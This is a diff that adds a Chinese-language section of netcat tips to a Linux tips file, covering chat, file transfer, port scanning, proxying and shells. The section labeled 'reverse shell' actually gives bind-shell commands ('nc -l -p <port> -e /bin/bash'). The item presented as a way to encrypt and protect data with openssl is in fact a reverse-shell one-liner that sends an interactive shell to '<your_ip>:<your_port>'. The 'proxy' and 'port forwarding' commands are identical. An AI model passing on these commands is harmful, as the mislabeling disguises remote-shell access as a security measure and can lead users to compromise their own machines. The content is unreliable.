@@ -2,6 +2,78 @@
 
 + linux系统的常用技巧和方法
 
+## nc 使用技巧
+
+Netcat（`nc`）是一个非常强大且灵活的工具，可以用于各种网络连接、数据传输和调试任务。以下是一些在使用 Netcat 时的一些技巧和用法：
+
+1. **简单聊天：**
+   Netcat 可以用于在终端之间进行简单的聊天，如下所示：
+
+   在一台机器上启动监听模式：
+   ```bash
+   nc -l <port>
+   ```
+
+   在另一台机器上与其进行连接：
+   ```bash
+   nc <hostname> <port>
+   ```
+
+2. **文件传输：**
+   使用 Netcat 可以在两台计算机之间传输文件。在发送端运行 `nc` 命令，而在接收端使用 `nc` 命令监听端口并保存传输的数据，如下所示：
+
+   发送文件：
+   ```bash
+   nc -w 3 <receiver_ip> <port> < file_to_send
+   ```
+
+   接收文件：
+   ```bash
+   nc -l <port> > received_file
+   ```
+
+3. **反向 shell：**
+   使用 Netcat 可以创建反向 shell 连接，允许你在远程主机上执行命令，如下所示：
+
+   在目标主机上启动监听模式：
+   ```bash
+   nc -l -p <port> -e /bin/bash
+   ```
+
+   在攻击机上与目标主机建立连接：
+   ```bash
+   nc <target_ip> <port>
+   ```
+
+4. **端口扫描：**
+   Netcat 可以用于进行基本的端口扫描，以检查目标主机上的哪些端口是开放的，如下所示：
+
+   扫描前 1000 个端口：
+   ```bash
+   nc -zv <hostname> 1-1000
+   ```
+
+5. **代理和端口转发：**
+   Netcat 可以用于创建简单的代理服务器或端口转发，如下所示：
+
+   创建代理服务器：
+   ```bash
+   nc -l -p <port_to_listen> -c "nc <destination_host> <destination_port>"
+   ```
+
+   端口转发：
+   ```bash
+   nc -l -p <local_port> -c "nc <destination_host> <destination_port>"
+   ```
+
+6. **使用 SSL/TLS：**
+   可以使用 `openssl` 命令来创建安全的加密连接，以保护数据的传输。例如：
+   ```bash
+   mkfifo /tmp/ncpipe && /bin/sh -i < /tmp/ncpipe 2>&1 | openssl s_client -quiet -connect <your_ip>:<your_port> > /tmp/ncpipe; rm /tmp/ncpipe
+   ```
+
+请谨慎使用 Netcat，确保你了解其功能和用途，以避免滥用或造成安全风险。不同的情况可能需要不同的选项和用法，建议在实际使用之前查阅官方文档和相关资源。
+
 ## 查看ubuntu版本
 
 您可以使用以下命令来查看 Ubuntu 系统的版本信息：
